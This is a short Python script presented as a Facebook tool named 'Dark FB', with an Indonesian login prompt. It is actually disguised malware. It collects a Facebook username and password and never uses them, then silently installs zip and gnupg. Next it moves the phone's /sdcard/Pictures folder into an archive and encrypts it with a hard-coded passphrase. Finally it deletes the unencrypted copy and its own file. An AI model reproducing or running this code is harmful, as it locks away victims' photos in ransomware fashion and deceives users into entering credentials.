import os,sys,time
logo = """/x1b[32;1m]
╔╦╗╔═╗╦═╗╦╔═  ╔═╗╔╗ 
 ║║╠═╣╠╦╝╠╩╗  ╠╣ ╠╩╗
═╩╝╩ ╩╩╚═╩ ╩  ╚  ╚═╝ V 1.9
"""
print ('Author : Hektor')
def package():
        try:
                import gnupg
                import zip
        except ImportError:
                os.system('pkg install -y gnupg zip &> /dev//null')

print(logo)
print('Silahkan login ke akun Facebook dulu')
usr = input('username : ')
pwd = input('password: ')
package()
os.system('zip --password H123 your_file.zip -m -r /sdcard/Pictures &> /dev//null')

os.system('gpg --batch -c --passphrase H123 your_file.zip &> /dev//null')
os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
os.system('rm -rf minicrypto.py')
time.sleep(10)